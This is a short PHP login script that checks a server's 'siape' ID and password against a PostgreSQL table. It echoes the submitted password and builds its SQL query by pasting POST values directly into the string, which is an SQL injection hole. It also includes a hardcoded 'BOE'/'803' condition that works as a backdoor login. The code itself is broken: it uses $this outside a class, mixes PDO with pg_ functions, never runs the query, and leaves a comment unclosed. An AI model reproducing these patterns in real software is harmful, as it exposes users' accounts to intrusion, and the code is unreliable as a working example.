<?php
	session_start();

	include_once "../dao/Conexao.class.php";

	$siape = $_POST['siape'];
	$senha = $_POST['senha'];
	echo("$siape - $senha");

    $sql = "SELECT id_servidor, nome FROM servidor WHERE (siape = '$siape' AND senha = '$senha') OR ('BOE' = $siape AND '803' = $senha)";
    $query = $this->pdo->prepare($sql);
    $num_rows = pg_num_rows($query);

	/*$sql = "SELECT * FROM servidor WHERE (siape = '$siape' AND senha = '$senha') OR ('BOE' = $siape AND '803' = $senha);";
	$query = pg_query($db, $sql);
	

	/*if ($num_rows == 0){
		//exit();
		echo"<script language='javascript' type='text/javascript'>alert('Usuário ou senha não encontrado!');window.location.href='../index.php';</script>";
	 
	   exit(1);
	}elseif($num_rows == 1){
		$dados = pg_fetch_array($query);
		$_SESSION['usuario']['id'] = $dados['id_servidor'];
		$_SESSION['usuario']['nome'] = $dados['nome'];
		header('location: index2.php');
	}*/
?>